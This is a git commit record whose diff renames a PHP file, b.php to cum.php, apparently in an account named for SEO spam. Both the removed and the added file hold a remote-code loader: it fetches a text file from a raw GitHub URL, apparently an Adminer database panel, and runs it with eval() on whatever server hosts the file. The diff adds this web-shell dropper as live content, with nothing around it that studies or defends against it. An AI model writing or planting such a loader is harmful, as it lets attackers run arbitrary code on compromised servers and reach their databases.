037192028a2cf49f3f28d2cc01ceb466801a7be2
seobadboyz403-alt <seobadboyz403@gmail.com>
2026-09-15 22:27:28 +0700

    Update and rename b.php to cum.php

--- b.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-$content = file_get_contents(urldecode('https://raw.githubusercontent.com/yourfr13nds/backburner/main/adminer.php'));
-
-$content = "?> ".$content;
-eval($content);
---
+++ cum.php
@@ -0,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/seobadboyz403-alt/ngacak/refs/heads/main/adminer-badboyz.txt'));
+
+$content = "?> ".$content;
+eval($content);
